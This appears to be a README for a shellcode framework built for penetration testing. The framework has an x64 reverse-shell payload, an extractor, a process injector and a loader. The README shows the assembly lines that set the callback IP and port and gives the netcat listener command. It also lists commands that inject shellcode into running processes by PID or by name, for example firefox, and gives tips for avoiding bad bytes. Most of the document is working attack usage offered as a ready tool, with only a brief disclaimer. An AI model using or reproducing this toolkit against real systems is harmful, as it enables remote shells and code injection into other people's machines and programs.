Overview

This framework provides a comprehensive toolkit for creating, analyzing, and injecting shellcode for security research and penetration testing purposes.

The framework consists of the following components:

Reverse Shell Payload

Position-independent x64 assembly shellcode that establishes a reverse shell connection.

Shellcode Extractor

Utility to extract shellcode from ELF binaries for use in exploits.

Shellcode Injector

Tool for injecting shellcode into processes using various methods.

Shellcode Loader

Test environment for executing and analyzing shellcode in a controlled setting.

Building the Framework

Use the following commands to build the framework and its components:

# Build all components
make

# Build individual components
make reverse_shell
make shellcode_extractor
make shellcode_injector
make shellcode_loader

# Build loader with embedded shellcode
make shellcode_loader_embedded

Using the Reverse Shell Payload

The reverse shell connects back to the specified IP address and port, providing remote shell access.

  1. Edit the IP address and port in reverse_shell.asm to match your listener:

    ; IP address (default: 192.168.1.10 = 0x0a01a8c0)
mov dword [rsp-4], 0x0a01a8c0

; Port (default: 4444 = 0x5c11)
mov word [rsp-2], 0x5c11

  2. Build the payload:

    make reverse_shell

  3. Set up a netcat listener on the target IP and port:

    nc -lvp 4444

Using the Shellcode Extractor

The extractor converts ELF binaries to shellcode format for use in exploits.

# Extract shellcode from an ELF binary
./shellcode_extractor reverse_shell shellcode.h

# Display usage information
./shellcode_extractor

Using the Shellcode Injector

The injector allows you to inject shellcode into running processes.

# Inject into your own process (for testing)
./shellcode_injector --self --shellcode shellcode.bin

# Inject into another process by PID
./shellcode_injector --pid 1234 --shellcode shellcode.bin

# Inject into a process by name
./shellcode_injector --process-name firefox --shellcode shellcode.bin

# Launch an executable and inject shellcode
./shellcode_injector --exec /bin/sleep --shellcode shellcode.bin

# Additional options
./shellcode_injector --help

Using the Shellcode Loader

The loader allows you to test shellcode in a controlled environment.

# Execute shellcode from a file
./shellcode_loader --file shellcode.bin

# Analyze shellcode for bad characters
./shellcode_loader --file shellcode.bin --analyze

# Dump shellcode in hex format
./shellcode_loader --file shellcode.bin --dump

# Execute with verbose output
./shellcode_loader --file shellcode.bin --execute --verbose

# Display usage information
./shellcode_loader --help

Tips for Creating Effective Shellcode

  1. Avoid NULL bytes (0x00) - These often terminate string operations and can break shellcode execution.
  2. Minimize size - Smaller shellcode has better chances of fitting into limited buffer spaces.
  3. Use position-independent code - Shellcode should execute correctly regardless of its location in memory.
  4. Avoid other bad characters depending on the context:
    • 0x0A (newline)
    • 0x0D (carriage return)
    • 0x20 (space)
    • 0xFF (may be interpreted as an EOF marker)
  5. Test thoroughly in a controlled environment before deployment.

Security Considerations

This framework is provided for educational purposes and legitimate security testing only. Unauthorized use against systems without explicit permission is illegal and unethical.

Debugging

When testing shellcode, use the analyzer first to check for potential issues:

./shellcode_loader --file shellcode.bin --analyze

For more detailed debugging, you can use GDB with the shellcode loader:

gdb --args ./shellcode_loader --file shellcode.bin

Common GDB commands for shellcode debugging:

  • break main - Set breakpoint at main
  • run - Start execution
  • disassemble - View assembly code
  • x/64bx $rip - Examine memory at current instruction pointer
  • stepi - Execute single instruction
